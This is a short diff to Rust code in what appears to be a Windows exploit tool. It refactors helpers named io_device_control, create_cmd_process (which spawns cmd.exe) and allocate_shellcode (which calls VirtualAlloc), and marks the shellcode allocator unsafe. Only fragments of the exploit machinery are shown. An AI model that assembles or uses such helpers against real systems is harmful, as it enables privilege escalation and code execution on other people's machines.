@@ -1,5 +1,4 @@
 use core::ffi::c_void;
-use std::usize;
 use thiserror::Error;
 
 use windows::Win32::System::{
@@ -99,13 +98,14 @@ pub fn io_device_control(
 }
 
 pub fn create_cmd_process() -> PROCESS_INFORMATION {
-    let mut si = STARTUPINFOA::default();
-    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
-    si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdInput = INVALID_HANDLE_VALUE;
-    si.hStdOutput = INVALID_HANDLE_VALUE;
-    si.hStdError = INVALID_HANDLE_VALUE;
-
+    let si = windows::Win32::System::Threading::STARTUPINFOA {
+        cb: std::mem::size_of::<STARTUPINFOA>() as u32,
+        dwFlags: STARTF_USESTDHANDLES,
+        hStdInput: INVALID_HANDLE_VALUE,
+        hStdOutput: INVALID_HANDLE_VALUE,
+        hStdError: INVALID_HANDLE_VALUE,
+        ..Default::default()
+    };
     let mut pi = PROCESS_INFORMATION::default();
 
     let command_line = "cmd.exe\0".as_ptr() as *mut u8;
@@ -129,7 +129,14 @@ pub fn create_cmd_process() -> PROCESS_INFORMATION {
     }
 }
 
-pub fn allocate_shellcode(shellcode: *const u8, shellcode_len: usize) -> (*mut c_void, usize) {
+/// # Safety
+///
+/// This function is unsafe because it uses raw pointers and assumes that the caller has the necessary permissions and knowledge about the memory layout.
+/// It is the responsibility of the caller to ensure that the memory is allocated correctly and that the shellcode is valid.
+pub unsafe fn allocate_shellcode(
+    shellcode: *const u8,
+    shellcode_len: usize,
+) -> (*mut c_void, usize) {
     unsafe {
         let sc = VirtualAlloc(
             None,
